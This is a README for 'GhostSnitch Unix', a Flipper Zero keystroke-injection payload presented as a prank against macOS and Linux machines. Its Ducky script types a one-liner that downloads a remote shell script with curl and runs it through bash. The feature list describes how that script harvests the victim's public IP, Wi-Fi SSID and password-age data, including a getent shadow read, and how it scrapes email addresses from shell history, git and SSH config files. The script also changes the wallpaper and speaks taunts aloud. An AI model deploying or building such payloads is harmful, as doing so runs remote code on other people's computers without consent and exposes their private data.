# GhostSnitch Unix

**Version:** 1.2  
**Author:** I am TBJr  
**Platform:** macOS (Monterey+) · Linux (GNOME, KDE, X11)  
**Delivery:** Flipper Zero HID (terminal one-liner)

---

## What it does

Cross-platform roast prank. Gathers system info, speaks roasts via the platform's TTS engine, and changes the desktop wallpaper.

---

## Features

- **TTS chain**: `say` (macOS) → `spd-say` → `espeak-ng` → `espeak` → `festival` → `echo` fallback
- **RAM roast** — uses `free -m` on Linux (avoids rounding error of `free -g`); `sysctl hw.memsize` on macOS
- **Public IP** — `curl --max-time 5` with a fallback service; speaks a failure message instead of hanging on firewalled networks
- **WiFi SSID**:
  - macOS: detects the active Wi-Fi interface dynamically via `networksetup -listallhardwareports` (no longer hardcoded to `en0`)
  - Linux: `nmcli` → `iwgetid` fallback
- **Password age**:
  - Linux: `chage -l` with `getent shadow` fallback
  - macOS: shadow data requires root — reports honestly instead of silently stubbing
- **Email discovery** — searches `~/.bash_history`, `~/.zsh_history`, `~/.gitconfig`, `~/.config/git/config`, `~/.ssh/config`, `/etc/gitconfig`
- **Wallpaper change**:
  - macOS: `System Events` AppleScript (not deprecated Finder method); tries a prioritised list of valid picture paths across macOS 11–15
  - GNOME: sets both `picture-uri` and `picture-uri-dark` (required on GNOME 42+); searches for any valid image dynamically
  - KDE: `plasma-apply-wallpaperimage`

## Ducky script

```
GUI r         ← Linux run dialog (Alt+F2 on GNOME, Ctrl+Alt+T on many setups)
DELAY 600
STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_unix.sh)"
ENTER
```

> **Note:** `GUI r` sends the Meta/Windows key + R. This opens a run dialog on some Linux DEs (KDE, Xfce). On GNOME use `ALT F2` instead. On macOS, `GUI r` sends Cmd+R which does not open a terminal — use a different shortcut appropriate to the target setup.

## Known limitations

- macOS password age is unavailable without root
- macOS wallpaper change via `System Events` AppleScript may trigger a "Terminal wants to control System Events" TCC permission dialog on first run
- Wallpaper change is silently skipped if no valid image path is found

## Credits

Inspired by AcidBurn by [I am Jakoby](https://github.com/I-Am-Jakoby). Rebuilt for Unix platforms by **TBJr**.
